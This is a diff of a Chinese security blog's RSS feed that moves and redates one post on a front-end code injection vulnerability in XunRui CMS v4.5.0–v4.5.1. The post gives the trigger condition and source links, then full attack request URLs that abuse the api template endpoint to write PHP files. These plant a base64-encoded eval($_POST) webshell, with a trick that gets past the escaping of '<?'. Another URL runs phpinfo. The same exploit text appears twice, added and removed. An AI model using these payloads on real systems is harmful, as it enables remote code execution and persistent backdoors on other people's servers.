@@ -6,7 +6,51 @@
         <description>Recent content in expliot-db on Weltolk</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 02 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://weltolk.github.io/tags/expliot-db/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 31 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://weltolk.github.io/tags/expliot-db/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞</title>
+        <link>https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
+        <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;img src="https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db.png" alt="Featured image of post 迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞" /&gt;&lt;h2 id=&#34;触发条件&#34;&gt;触发条件&lt;/h2&gt;
+&lt;p&gt;一个条件:&lt;/p&gt;
+&lt;p&gt;1.迅睿CMS 版本为v4.5.0到v4.5.1&lt;/p&gt;
+&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/10002&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://xz.aliyun.com/t/10002&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://w4nder.top/index.php/2021/09/18/xunruicms-rce/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://w4nder.top/index.php/2021/09/18/xunruicms-rce/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Internet Archive&amp;rsquo;s Wayback Machine:&lt;/p&gt;
+&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;https://web.archive.org/web/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://web.archive.org/web/&lt;/a&gt;&lt;em&gt;/https://xz.aliyun.com/t/10002)[https://web.archive.org/web/&lt;/em&gt;/https://xz.aliyun.com/t/10002]&lt;/p&gt;
+&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;https://web.archive.org/web/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://web.archive.org/web/&lt;/a&gt;&lt;em&gt;/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/)[https://web.archive.org/web/&lt;/em&gt;/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/]&lt;/p&gt;
+&lt;p&gt;google快照:&lt;/p&gt;
+&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002&amp;#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;lr=lang_en&lt;/a&gt;|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja)[https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002+&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja]&lt;/p&gt;
+&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/&amp;#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;lr=lang_en&lt;/a&gt;|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja)[http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/+&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja]&lt;/p&gt;
+&lt;p&gt;bing快照:&lt;/p&gt;
+&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;amp;d=4793325569704282&amp;amp;mkt=zh-CN&amp;amp;setlang=en-US&amp;amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm%29[http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;amp;d=4793325569704282&amp;amp;mkt=zh-CN&amp;amp;setlang=en-US&amp;amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm]&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;d=4793325569704282&amp;mkt=zh-CN&amp;setlang=en-US&amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm)[http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;d=4793325569704282&amp;mkt=zh-CN&amp;setlang=en-US&amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm]&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;一个利用方式&#34;&gt;一个利用方式&lt;/h2&gt;
+&lt;p&gt;写webshell文件:&lt;/p&gt;
+&lt;p&gt;写入的文件默认是在网站根目录下&lt;/p&gt;
+&lt;p&gt;1.经过测试,如果写入的内容包含&lt;code&gt;&amp;lt;?&lt;/code&gt;,会被url转义,但是先写&lt;code&gt;&amp;lt;&lt;/code&gt;再写&lt;code&gt;?&lt;/code&gt;就不会被转义,写入php标记为&lt;code&gt;&amp;lt;?=&#39;&#39;;?&amp;gt;&lt;/code&gt;的php文件,先写&lt;code&gt;&amp;lt;&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&amp;lt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2.写剩余的语句:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?=&#39;&#39;;file_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;1.写入php标记为&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;的php文件,先写&lt;code&gt;&amp;lt;&lt;/code&gt;:
+&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&amp;lt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2.写剩余的语句:
+&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;写完之后,访问执行webshell2.php,会在同目录下生成webshell.php文件,webshell.php即为webshell&lt;/p&gt;
+&lt;h2 id=&#34;执行无参函数&#34;&gt;执行无参函数&lt;/h2&gt;
+&lt;p&gt;如果想执行无参函数,例如&lt;code&gt;phpinfo();&lt;/code&gt;,将url中的&lt;code&gt;param0&lt;/code&gt;参数设为&lt;code&gt;-1&lt;/code&gt;即可:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=phpinfo%20param0=-1&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞</title>
         <link>https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link>
         <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
@@ -2520,50 +2564,6 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;</description>
-        </item>
-        <item>
-        <title>迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞</title>
-        <link>https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
-        <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
-        
-        <guid>https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
-        <description>&lt;img src="https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db.png" alt="Featured image of post 迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞" /&gt;&lt;h2 id=&#34;触发条件&#34;&gt;触发条件&lt;/h2&gt;
-&lt;p&gt;一个条件:&lt;/p&gt;
-&lt;p&gt;1.迅睿CMS 版本为v4.5.0到v4.5.1&lt;/p&gt;
-&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/10002&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://xz.aliyun.com/t/10002&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://w4nder.top/index.php/2021/09/18/xunruicms-rce/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;http://w4nder.top/index.php/2021/09/18/xunruicms-rce/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Internet Archive&amp;rsquo;s Wayback Machine:&lt;/p&gt;
-&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;https://web.archive.org/web/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://web.archive.org/web/&lt;/a&gt;&lt;em&gt;/https://xz.aliyun.com/t/10002)[https://web.archive.org/web/&lt;/em&gt;/https://xz.aliyun.com/t/10002]&lt;/p&gt;
-&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;https://web.archive.org/web/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://web.archive.org/web/&lt;/a&gt;&lt;em&gt;/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/)[https://web.archive.org/web/&lt;/em&gt;/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/]&lt;/p&gt;
-&lt;p&gt;google快照:&lt;/p&gt;
-&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002&amp;#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;lr=lang_en&lt;/a&gt;|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja)[https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002+&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja]&lt;/p&gt;
-&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/&amp;#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;lr=lang_en&lt;/a&gt;|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja)[http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/+&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja]&lt;/p&gt;
-&lt;p&gt;bing快照:&lt;/p&gt;
-&lt;p&gt;(&lt;a class=&#34;link&#34; href=&#34;http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;amp;d=4793325569704282&amp;amp;mkt=zh-CN&amp;amp;setlang=en-US&amp;amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm%29[http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;amp;d=4793325569704282&amp;amp;mkt=zh-CN&amp;amp;setlang=en-US&amp;amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm]&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;d=4793325569704282&amp;mkt=zh-CN&amp;setlang=en-US&amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm)[http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;d=4793325569704282&amp;mkt=zh-CN&amp;setlang=en-US&amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm]&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;一个利用方式&#34;&gt;一个利用方式&lt;/h2&gt;
-&lt;p&gt;写webshell文件:&lt;/p&gt;
-&lt;p&gt;写入的文件默认是在网站根目录下&lt;/p&gt;
-&lt;p&gt;1.经过测试,如果写入的内容包含&lt;code&gt;&amp;lt;?&lt;/code&gt;,会被url转义,但是先写&lt;code&gt;&amp;lt;&lt;/code&gt;再写&lt;code&gt;?&lt;/code&gt;就不会被转义,写入php标记为&lt;code&gt;&amp;lt;?=&#39;&#39;;?&amp;gt;&lt;/code&gt;的php文件,先写&lt;code&gt;&amp;lt;&lt;/code&gt;:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&amp;lt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;2.写剩余的语句:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?=&#39;&#39;;file_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;1.写入php标记为&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;的php文件,先写&lt;code&gt;&amp;lt;&lt;/code&gt;:
-&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&amp;lt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;2.写剩余的语句:
-&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;写完之后,访问执行webshell2.php,会在同目录下生成webshell.php文件,webshell.php即为webshell&lt;/p&gt;
-&lt;h2 id=&#34;执行无参函数&#34;&gt;执行无参函数&lt;/h2&gt;
-&lt;p&gt;如果想执行无参函数,例如&lt;code&gt;phpinfo();&lt;/code&gt;,将url中的&lt;code&gt;param0&lt;/code&gt;参数设为&lt;code&gt;-1&lt;/code&gt;即可:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=phpinfo%20param0=-1&lt;/code&gt;&lt;/p&gt;
-</description>
         </item>
         
     </channel>
